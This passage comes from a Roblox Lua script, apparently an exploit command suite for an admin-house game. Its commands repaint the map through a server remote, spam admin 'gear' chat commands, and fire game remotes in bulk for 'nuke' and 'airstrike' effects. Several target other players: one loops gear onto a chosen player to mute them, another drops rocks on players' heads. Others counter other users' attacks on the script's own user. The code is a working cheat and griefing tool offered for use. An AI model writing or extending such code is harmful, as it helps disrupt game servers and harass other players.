					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						local v8 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright red"))
							}
						remote:InvokeServer(v1, v8)
					end
					
					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						local v9 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark orange"))
							}
						remote:InvokeServer(v1, v9)
					end
					
					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
						local v10 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
							}
						remote:InvokeServer(v1, v10)
					end
					
					if v.Name == "SmoothBlockModel112" then
						local v11 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium blue"))
							}
						remote:InvokeServer(v1, v11)
					end
					
					if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
						local v12 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Reddish brown"))
							}
						remote:InvokeServer(v1, v12)
					end
					
					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
						local v13 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Sand red"))
							}
						remote:InvokeServer(v1, v13)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "Part29" or v.Name == "Part31" or v.Name == "Part55" then
						local v14 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
						remote:InvokeServer(v1, v14)
					end
				
					if v.Name == "Part11" or v.Name == "Part18" or v.Name == "Part25" or v.Name == "Part3" or v.Name == "Part43" then
						local v15 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Deep blue"))
							}
						remote:InvokeServer(v1, v15)
					end
				
					if v.Name == "Part13" or v.Name == "Part21" or v.Name == "Part23" or v.Name == "Part7" then
						local v16 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Institutional white"))
							}
						remote:InvokeServer(v1, v16)
					end
					
					if v.Name == "Part17" or v.Name == "Part26" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v17 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Lime green"))
							}
						remote:InvokeServer(v1, v17)
					end
					
					if v.Name == "Part30" or v.Name == "Part32" or v.Name == "Part33" or v.Name == "Part34" or v.Name == "Part35" or v.Name == "Part36" or v.Name == "Part39" or v.Name == "Part40" or v.Name == "Part41" or v.Name == "Part42" or v.Name == "Part46" or v.Name == "Part47" or v.Name == "Part48" or v.Name == "Part49" or v.Name == "Part50" or v.Name == "Part51" or v.Name == "Part52" or v.Name == "Part53" or v.Name == "Part54" or v.Name == "Part56" or v.Name == "Part57" or v.Name == "Part58" or v.Name == "Part59" or v.Name == "Part60" or v.Name == "Part61" or v.Name == "Part38" or v.Name == "Part5" or v.Name == "Part9" then
						local v18 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium Stone grey"))
							}
						remote:InvokeServer(v1, v18)
					end
					
					if v.Name == "Part12" or v.Name == "Part15" or v.Name == "Part24" or v.Name == "Part44" or v.Name == "Part6" then
						local v19 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("New yeller"))
							}
						remote:InvokeServer(v1, v19)
					end
					
					if v.Name == "Part14" or v.Name == "Part19" or v.Name == "Part2" or v.Name == "Part27" then
						local v20 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really black"))
							}
						remote:InvokeServer(v1, v20)
					end
					
					if v.Name == "Part1" or v.Name == "Part10" or v.Name == "Part16" or v.Name == "Part22" or v.Name == "Part37" then
						local v21 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Really red"))
							}
						remote:InvokeServer(v1, v21)
					end
					
					if v.Name == "Part20" or v.Name == "Part28" or v.Name == "Part4" or v.Name == "Part45" or v.Name == "Part8" then
						local v22 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Toothpaste"))
							}
						remote:InvokeServer(v1, v22)
					end
				end)
			end
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace.Obby:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v23 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Really red"))
						}
					remote:InvokeServer(v1, v23)
				end
				
				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
					if v:IsA("Part") then
						local v24 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Teal"))
							}
						remote:InvokeServer(v1, v24)
					end
				end
			end)
		end
end)
wait(1.5)
			if ObbyDestroyed then runCommand(prefix.."localremoveobby",{}) end
end)

addCommand("rapidfiregun",{"bullets"},function(args)
Connections.rapidfiregun = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
if gp then return end
if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 139578207")
    wait()
end
wait(0.2)
for i,v in pairs(lp.Backpack:GetChildren()) do
    v.Parent = chr
    wait()
    local A_1 = plr:GetMouse().Hit.p
    v.Click:FireServer(A_1)
end
for i=1,tonumber(args[1]) do
    wait(0.1)
end
game.Players:Chat("removetools me")
end
end)
end)

addCommand("unrapidfiregun",{},function()
    Connections.rapidfiregun:Disconnect()
end)

addCommand("airstrike",{},function()
    local function equiptools()
    for _, v in ipairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
        if v:IsA('Tool') then
        v.Parent = game.Players.LocalPlayer.Character
        end
    end
end
Connections.airstrike = game:GetService("UserInputService").InputBegan:Connect(function(inputa,gp)
if gp then return end
if inputa.UserInputType == Enum.UserInputType.MouseButton1 then
for i = 1, 5 do
            game.Players:Chat("gear me 169602103")
            end
            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5
            equiptools()
            for i = 1, 1000 do
                pcall(function()
                    game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(game.Players.LocalPlayer:GetMouse().Hit.p,Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
                end)
            end
            wait(10)
            game.Players:Chat("removetools me")
end
end)
end)

addCommand("unairstrike",{},function()
    Connections.airstrike:Disconnect()
end)

addCommand("discoball",{"amount"},function(args)
    for i=1, tonumber(args[1]) do
        game.Players:Chat("gear me 27858062")
        lp.Backpack:WaitForChild("DancePotion",30)
        local potion = lp.Backpack.DancePotion
        potion.Parent = lp.Character
        potion:Activate()
        wait(0.1)
        game.Players:Chat("reset me")
        wait(0.1)
    end
end)

addCommand("table",{"amount"},function(args)
	for i=1, tonumber(args[1]) do
		game.Players:Chat("gear me 110789105")
		wait()
	end
	wait(0.25)
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    		v.Parent = game.Players.LocalPlayer.Character
	end
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    		if v:IsA("Tool") then
        		v:Activate()
    		end
	end
end)

addCommand("periastronhell",{"amount"},function(args)
local gears = {"159229806","73829193","108158379","69499437","233520257","99119240","80661504","139577901","93136802","2544549379"}
for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me "..gears[math.random(1,#gears)])
    wait()
end
wait(0.25)
for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        local s,f=pcall(function()
        v:WaitForChild("Remote",10):FireServer(Enum.KeyCode.Q)
        end) if  not s then  print(f)end
    end
end
end)

addCommand("spamgear",{"amount","gear"},function(args)
for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me "..args[2])
    wait()
end
wait(0.25)
for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        v:Activate()
    end
end
end)

addCommand("spamgear2",{"amount","gear"},function(args)
for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me "..args[2])
    wait()
end
wait(0.25)
for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()if v.Parent==chr then  v:Activate()end end)
    end
end
end)

addCommand("loudboombox",{"amount","id","range"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 212641536")
    wait()
end
wait(0.1)
for i,v in pairs(plr.Backpack:GetChildren()) do v.GripPos = Vector3.new(math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3])) v.Parent=chr end
wait()
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        pcall(function()
            v.Remote:FireServer("PlaySong",args[2])
        end)
    end
end
end)

addCommand("boombox",{},function()
    game.Players:Chat("gear me 212641536")
end)

addCommand("sillyguitar",{"amount","song","range"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 57229371")
    wait()
end
wait(0.1)
for i,v in pairs(plr.Backpack:GetChildren()) do v.GripPos = Vector3.new(math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3]),math.random(tonumber(args[3])*-2,args[3])) v.Parent=chr end
wait()
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()
            if v and v.Parent == game.Players.LocalPlayer.Character then
                if args[2] ~= "all" then
                if not v.Handle["Song"..args[2]].IsPlaying then v.Handle["Song"..args[2]]:Play() end
                else
                    for i,xz in pairs(v.Handle:GetChildren()) do if xz:IsA("Sound") then if not xz.IsPlaying then xz:Play() end end end
                end
            end
        end)
    end
end
end)

addCommand("nuke",{"amount","range"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 88885539")
    wait()
end
wait(0.1)
for i,v in pairs(plr.Backpack:GetChildren()) do v.Parent=chr end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        pcall(function()
            v.OnMouseClick:FireServer(chr.HumanoidRootPart.Position+Vector3.new(math.random(args[2]*-1,args[2]),0,math.random(args[2]*-1,args[2])))
        end)
    end
end
end)

addCommand("rocknuke",{"amount","range"},function(args)
	for i=1,tonumber(args[1]) do
		dropRock(Vector3.new(math.random(tonumber(args[2])*-1,tonumber(args[2])),math.random(tonumber(args[2])*-1,tonumber(args[2])),math.random(tonumber(args[2])*-1,tonumber(args[2]))))
	end
end)

addCommand("nuke2",{},function()
    local function equiptools()
    for _, v in ipairs(game.Players.LocalPlayer:FindFirstChildOfClass("Backpack"):GetChildren()) do
        if v:IsA('Tool') then
        v.Parent = game.Players.LocalPlayer.Character
        end
    end
end
for i = 1, 5 do
            game.Players:Chat("gear me 169602103")
            end
            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5
            equiptools()
            for i = 1, 1000 do
                game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(math.random(-200,200), math.random(-40,40), math.random(-200,200)),Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
            end
            wait(10)
            game.Players:Chat("removetools me")
end)

addCommand("spawnzombies",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 26421972")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("alpaca",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 292969139")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("muteplayer",{"player"},function(args)
    Loops.mute = true
    repeat 
    for i,v in pairs(GetPlayers(args[1])) do
        game.Players:Chat("gear "..v.Name.." 253519495")
    end
    until not Loops.mute
end)

addCommand("unmute",{},function()
    Loops.mute = false
end)

addCommand("cloneai",{"amount"},function(args)
    game.Players:Chat("pm me ["..ScriptName.."]\nCredits to Reaper for the command idea.")
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 72644644")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("mozart",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 113299590")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("bassdrop",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 152233094")
    wait()
end
wait(0.25)
   for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()if v.Parent==chr then  v:Activate()end end)
    end
end
end)

addCommand("droprock",{"player"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		if v and v.Character and v.Character:FindFirstChild("Head") then
			dropRock(v.Character.Head.Position)
		end
	end
end)

addCommand("coolstoryman",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
    game.Players:Chat("gear me 119101643")
    wait()
end
wait(0.25)
   for i,v  in pairs(plr.Backpack:GetChildren()) do
    local staff = v
    v.Parent = chr
end
wait(0.1)
for i,v  in pairs(chr:GetChildren()) do
    if v:IsA("Tool") then
        game:GetService("RunService").RenderStepped:Connect(function()if v.Parent==chr then  v:Activate()end end)
    end
end
end)

addCommand("bananapeel",{"amount"},function(args)
    for i=1,tonumber(args[1]) do
        game.Players:Chat("gear me 29100449")
        wait()
    end
    wait(0.25)
    for i,v  in pairs(plr.Backpack:GetChildren()) do
        local staff = v
        v.Parent = chr
    end
    wait(0.1)
    for i,v  in pairs(chr:GetChildren()) do
        if v:IsA("Tool") then
            v:Activate()
        end
    end
end)

addCommand("tripmine",{"amount"},function(args)
	for i=1, tonumber(args[1]) do
		game.Players:Chat("gear me 11999247")
		wait()
	end
	wait(0.25)
	for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    		v.Parent = game.Players.LocalPlayer.Character
	end
	for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    		if v:IsA("Tool") then
        		v:Activate()
    		end
	end
end)

addCommand("spikespam",{"amount"},function(args)
    for i=1,tonumber(args[1])do
game.Players:Chat("gear me 59848474")
wait()
end
wait(0.25)
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
    v.Parent = game.Players.LocalPlayer.Character
end
wait(0.1)
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Tool") then
        v.ClientInput:FireServer(Enum.KeyCode.E)
        wait()
        v:Activate()
        wait()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(360/tonumber(args[1])),0)
    end
end
end)

addCommand("spawnjail",{},function()
        game.Players:Chat("jail me")
        wait(0.2)
        chr.HumanoidRootPart.CFrame = chr.HumanoidRootPart.CFrame*CFrame.new(0,4,0)
end)

addCommand("antiabuse",{},function()
    Loops.antiabuse = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if chr and chr.Parent == game.Lighting then
            game.Players:Chat("unpunish me")
		chr.Parent=workspace
        end
        if lp.PlayerGui:FindFirstChild("EFFECTGUIBLIND") then
            lp.PlayerGui:FindFirstChild("EFFECTGUIBLIND"):Destroy()
            game.Players:Chat("unblind me")
        end
        if chr and chr.Humanoid and chr.Humanoid.Health <=0 then
            game.Players:Chat("reset me")
        end
	if chr and chr:FindFirstChild("Rocket") then
		for i,v in pairs(chr:GetChildren()) do if v.Name=="Rocket" then v:Destroy() end end
		if PersonsAdmin then game.Players:Chat("unrocket/me") else game.Players:Chat("reset me") end
	end
        if chr and chr:FindFirstChild("ice") then
            game.Players:Chat("unfreeze me")
            chr:FindFirstChild("ice"):Destroy()
            for i,v in pairs(chr:GetDescendants()) do
                if v:IsA("BasePart") then v.Anchored = false end
            end
        end
        if chr and chr:FindFirstChild("Addon") then
            chr:FindFirstChild("Addon"):Destroy()
            game.Players:Chat("reset me")
        end
        if chr and chr.Head and chr.Torso and game.Players.LocalPlayer:DistanceFromCharacter(game.Players.LocalPlayer.Character.Torso.Position) == 0 then
            game.Players:Chat("reset me")
        end
        if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr.Name.."'s jail") then
            game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild(plr.Name.."'s jail"):Destroy()
            game.Players:Chat("unjail me")
        end
        if chr and chr.Torso and chr.Torso:FindFirstChild("SPINNER") then
            chr.Torso:FindFirstChild("SPINNER"):Destroy()
            game.Players:Chat("unspin me")
        end
        if plr.PlayerGui:FindFirstChild("NoClip") then
            plr.PlayerGui:FindFirstChild("NoClip"):Destroy()
            if chr and chr.Torso then chr.Torso.Anchored = false end
            if chr and chr.Humanoid then chr.Humanoid.PlatformStand = false end
            game.Players:Chat("clip me")
        end
    end)until not Loops.antiabuse
end)

addCommand("antispeed",{},function()
	local function onChar(Char)
		repeat wait() until Char:FindFirstChildOfClass("Humanoid")
			Connections.antispeedb = Char.Humanoid.Changed:Connect(function(prop)
				if prop == "WalkSpeed" then
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
				end
		end)
	end
	
	Connections.antispeeda = game.Players.LocalPlayer.CharacterAdded:Connect(onChar)
	onChar(game.Players.LocalPlayer.Character)
end)

addCommand("unantispeed",{},function()
	Connections.antispeeda:Disconnect()
	Connections.antispeedb:Disconnect()
end)

addCommand("antimessage",{},function()
	Loops.antimessage = true
	repeat game:GetService("RunService").RenderStepped:Wait()
		pcall(function()
			if game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintGui") then
				game.Players.LocalPlayer.PlayerGui:FindFirstChild("HintGui"):Destroy()
				game.Players:Chat("clr")
			end
			if game.Players.LocalPlayer.PlayerGui:FindFirstChild("MessageGui") then
				game.Players.LocalPlayer.PlayerGui:FindFirstChild("MessageGui"):Destroy()
				game.Players:Chat("clr")
			end
			
			if game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message") then
				if not string.find(game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message").Text,ScriptName) then
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message"):Destroy()
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Message")
				end
			end
			if game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint") then
				if not string.find(game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint").Text,ScriptName) then
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint"):Destroy()
					game.Terrain["_Game"].Folder:FindFirstChildOfClass("Hint")
				end
			end
		end)
	until not Loops.antimessage
end)

addCommand("unantimessage",{},function()
	Loops.antimessage = false
end)

addCommand("antiepilepsy",{},function()
    Loops.antiepilepsy = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if workspace.Terrain["_Game"] and workspace.Terrain["_Game"].Folder and workspace.Terrain["_Game"].Folder:FindFirstChild("Flash") then
		workspace.Terrain["_Game"].Folder:FindFirstChild("Flash"):Destroy()
		game.Players:Chat("fix")
	end
    end)until not Loops.antiepilepsy
end)

addCommand("unantiepilepsy",{},function()
    Loops.antiepilepsy = false
end)

addCommand("antilighting",{},function()
    Loops.antilighting = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if game.Lighting.Ambient ~= Color3.new(0,0,0) or game.Lighting.OutdoorAmbient ~= Color3.fromRGB(128,128,128) or game.Lighting.Brightness ~= 1 or game.Lighting.ColorShift_Bottom ~= Color3.new(0,0,0) or game.Lighting.ColorShift_Top ~= Color3.new(0,0,0) or game.Lighting.EnvironmentDiffuseScale ~= 0 or game.Lighting.EnvironmentSpecularScale ~= 0 or game.Lighting.ShadowSoftness ~= 0.5 or game.Lighting.ClockTime ~= 14 or game.Lighting.GeographicLatitude ~= 41.733299255371094 or game.Lighting.FogStart ~= 0 or game.Lighting.FogEnd ~= 100000 or (math.floor(game.Lighting.FogColor.R*255)~=192 or math.floor(game.Lighting.FogColor.G*255)~=192 or math.floor(game.Lighting.FogColor.B*255)~=192) then
		game.Players:Chat("fix")
		game.Lighting.Ambient = Color3.new(0,0,0)
		game.Lighting.Brightness = 1
		game.Lighting.ColorShift_Bottom = Color3.new(0,0,0)
		game.Lighting.ColorShift_Top = Color3.new(0,0,0)
		game.Lighting.EnvironmentDiffuseScale = 0
		game.Lighting.EnvironmentSpecularScale = 0
		game.Lighting.OutdoorAmbient = Color3.fromRGB(128,128,128)
		game.Lighting.ShadowSoftness = 0.5
		game.Lighting.ClockTime = 14
		game.Lighting.GeographicLatitude = 41.733299255371094
		game.Lighting.FogStart = 0
		game.Lighting.FogEnd = 100000
		game.Lighting.FogColor = Color3.new(192/255,192/255,192/255)
	end
    end)until not Loops.antilighting
end)

addCommand("unantilighting",{},function()
    Loops.antilighting = false
end)

addCommand("crashdetector",{},function()
	Loops.crashdetector = true
	repeat wait(10) spawn(function()
		runCommand(prefix.."if",{"iscrashed","then","prompttoserverhop"})
	end) until not Loops.crashdetector
end)

addCommand("uncrashdetector",{},function()
	Loops.crashdetector = false
end)

addCommand("antifly",{},function()
    Loops.antifly = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
        if plr.PlayerGui:FindFirstChild("Fly") then
            plr.PlayerGui:FindFirstChild("Fly"):Destroy()
            if chr and chr.Torso then chr.Torso.Anchored = false end
            if chr and chr.Humanoid then chr.Humanoid.PlatformStand = false end
            game.Players:Chat("unfly me")
        end
    end)
    until not Loops.antifly
end)

addCommand("unantifly",{},function()
    Loops.antifly = false
end)

addCommand("antikick",{},function()
    Loops.antikick = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    if chr and chr:FindFirstChild("BlueBucket") then
        chr:FindFirstChild("BlueBucket"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("BlueBucket") then
        plr.Backpack:FindFirstChild("BlueBucket"):Destroy()
        game.Players:Chat("removetools me")
    end
    if chr and chr:FindFirstChild("HotPotato") then
        chr:FindFirstChild("HotPotato"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("HotPotato") then
        plr.Backpack:FindFirstChild("HotPotato"):Destroy()
        game.Players:Chat("removetools me")
    end
    if chr and chr:FindFirstChild("DriveBloxUltimateCar") then
        chr:FindFirstChild("DriveBloxUltimateCar"):Destroy()
        game.Players:Chat("removetools me")
    end
    if plr and plr.Backpack and plr.Backpack:FindFirstChild("DriveBloxUltimateCar") then
        plr.Backpack:FindFirstChild("DriveBloxUltimateCar"):Destroy()
        game.Players:Chat("removetools me")
    end
	for i,v in pairs(workspace:GetDescendants()) do
		if v and v.Name == "Rocket" then
			pcall(function()
				if v.CanCollide then
					v.CanCollide = false
				end
			end)
		end
	end
    end)until not Loops.antikick
end)

addCommand("anticrash",{},function()
    runCommand(prefix.."antikick",{})
end)

addCommand("unanticrash",{},function()
    runCommand(prefix.."unantikick",{})
end)

addCommand("unantikick",{},function()
    Loops.antikick = false
end)

addCommand("antiservercrash",{},function()
    Loops.antiservercrash = true
    repeat game:GetService("RunService").RenderStepped:Wait() pcall(function()
    for i,v in pairs(game.Players:GetPlayers()) do
        spawn(function()
